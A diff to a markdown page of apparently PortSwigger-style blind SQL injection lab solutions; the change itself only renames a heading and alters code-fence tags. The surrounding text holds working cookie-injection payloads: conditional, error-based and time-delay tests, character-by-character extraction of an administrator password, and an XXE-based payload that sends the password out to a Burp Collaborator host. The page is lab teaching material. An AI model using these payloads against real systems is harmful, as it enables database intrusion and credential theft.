@@ -1,4 +1,4 @@
-# Blind SQL injection vulnerabilities
+# Blind SQL injection
 
 ## Blind SQL injection with conditional responses
 
@@ -18,13 +18,13 @@ Cookie: TrackingId=d3KGutgKOMjnh4xT
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'd3KGutgKOMjnh4xT'
 ```
 
 Solution:
 
-```SQL
+```sql
 xyz' OR '1'='1
 xyz' OR '1'='2
 ' UNION SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > 19--
@@ -56,13 +56,13 @@ Cookie: TrackingId=CFO6j85RorXzU17G
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CFO6j85RorXzU17G'
 ```
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 19) THEN TO_CHAR(1/0) ELSE NULL END FROM users--
 ' UNION SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 20) THEN TO_CHAR(1/0) ELSE NULL END FROM users--
 ' UNION SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, §§, 1) = '§§') THEN TO_CHAR(1/0) ELSE NULL END FROM users--
@@ -90,13 +90,13 @@ Cookie: TrackingId=GozlT53MXFfyOacv
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'GozlT53MXFfyOacv'
 ```
 
 Solution:
 
-```SQL
+```sql
 ' || PG_SLEEP(10)--
 ```
 
@@ -124,13 +124,13 @@ Cookie: TrackingId=t7j8rI6oMCaPTlEC
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 't7j8rI6oMCaPTlEC'
 ```
 
 Solution:
 
-```SQL
+```sql
 '%3B SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, §§, 1) = '§§') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END FROM users--
 ```
 
@@ -156,13 +156,13 @@ Cookie: TrackingId=TGK463hgRPbVUYFr
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'TGK463hgRPbVUYFr'
 ```
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://tfc8d4161a43yingegd9r8gtskyxcgwy01p.burpcollaborator.net/"> %remote;]>'), '/l') FROM dual--
 ```
 
@@ -191,13 +191,13 @@ Cookie: TrackingId=UvXJQOPrW2sZMTtQ
 
 Target SQL query:
 
-```SQL
+```sql
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'UvXJQOPrW2sZMTtQ'
 ```
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gl5wgwoxuglwbr0onhix816ngem4at.burpcollaborator.net/"> %remote;]>'), '/a') FROM dual--
 ' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username%3D'administrator')||'.gl5wgwoxuglwbr0onhix816ngem4at.burpcollaborator.net/"> %remote;]>'), '/abc') FROM dual--
 ```
